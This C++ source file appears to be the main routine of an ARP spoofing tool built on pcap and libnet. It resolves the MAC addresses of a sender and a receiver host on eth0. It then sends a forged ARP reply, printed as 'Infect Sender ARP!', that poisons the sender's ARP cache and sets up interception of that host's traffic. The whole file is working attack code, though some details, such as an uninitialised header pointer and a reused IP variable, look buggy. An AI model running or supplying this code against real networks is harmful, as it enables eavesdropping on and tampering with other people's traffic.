// arp_main.cpp

#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <libnet.h>
#include <string.h>
#include "arp_spoof.h"

void arp_main(u_char *s_mac, u_char *d_mac, u_char *r_mac, u_char *f_mac,
		struct in_addr s_ip, struct in_addr d_ip, struct in_addr r_ip)
{
	struct libnet_ethernet_hdr *eth_hdr;	//ethernet header
	struct libnet_arp_hdr *arp_hdr;		//arp hedaer
	struct pcap_pkthdr *header;		//packet header	
	pcap_t *handle = NULL;
	
	const int arp_size = 42;	//arp_packet size (ether + arp)
	char errbuf[PCAP_ERRBUF_SIZE];
	char dev[] = "eth0";
	
	bpf_u_int32 mask;
	bpf_u_int32 net;
	
	u_char *packet;			//For the packet we send
	const u_char *reply;		//For arp reply packet
	
	char buf[INET_ADDRSTRLEN];			//For d_ip address
	int index = 0;

	packet = (u_char *)malloc(arp_size);
	
	eth_hdr = (struct libnet_ethernet_hdr *)malloc(sizeof(struct libnet_ethernet_hdr));
	arp_hdr = (struct libnet_arp_hdr *)malloc(sizeof(struct libnet_arp_hdr));
	memset(packet, 0, arp_size);		//initiallize the packet memory with 0's

	if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
	{
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}
	
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL)
	{
		fprintf(stderr, "%s\n", errbuf);
		exit(1);
	}

	send_arp(packet, s_mac, d_mac, s_ip, d_ip, handle, header, 1);

	while(1)					//Check the packets!
	{
		index++;
		pcap_next_ex(handle, &header, &reply);
		if(get_arp(reply, s_mac, d_mac, d_ip) == 1)	
			break;

		if(index > 50)				//If we check more than 50 packets
		{
			printf("No ARP REPLY packet is captured\n");
			exit(1);
		}
	}

	printf("\nSender MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n", 
		d_mac[0], d_mac[1], d_mac[2], d_mac[3], d_mac[4], d_mac[5]);
	printf("Sender IP address: %s\n\n", inet_ntop(AF_INET, &d_ip, buf, sizeof(buf)));

	//Receiver Part
	send_arp(packet, s_mac, r_mac, s_ip, r_ip, handle, header, 1);	//Send arp to Receiver

	while(1)					//Check the packets!
	{
		index++;
		pcap_next_ex(handle, &header, &reply);
		if(get_arp(reply, s_mac, r_mac, d_ip) == 1)	
			break;

		if(index > 50)				//If we check more than 50 packets
		{
			printf("No ARP REPLY packet is captured\n");
			exit(1);
		}
	}

	printf("Receiver MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n", 
		r_mac[0], r_mac[1], r_mac[2], r_mac[3], r_mac[4], r_mac[5]);
	printf("Receiver IP address: %s\n\n", inet_ntop(AF_INET, &d_ip, buf, sizeof(buf)));

	printf("Infect Sender ARP!\n");	
	send_arp(packet, f_mac, d_mac, r_ip, d_ip, handle, header, 2);	//Send fake ARP reply to sender
	//send_arp(packet, s_mac, r_mac, s_ip, r_ip, handle, header, 2);	//Send fake ARP reply to sender
	
	free(packet);
	free(eth_hdr);
	free(arp_hdr);
	
	pcap_close(handle);
}



